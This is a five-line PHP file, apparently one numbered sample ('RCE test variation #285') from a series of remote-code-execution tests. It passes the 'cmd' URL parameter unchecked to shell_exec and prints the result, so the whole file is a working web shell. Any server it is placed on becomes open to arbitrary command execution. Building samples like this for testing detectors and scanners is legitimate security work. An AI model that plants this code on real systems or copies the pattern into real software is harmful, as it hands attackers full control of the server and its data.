<?php
// RCE test variation #285
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>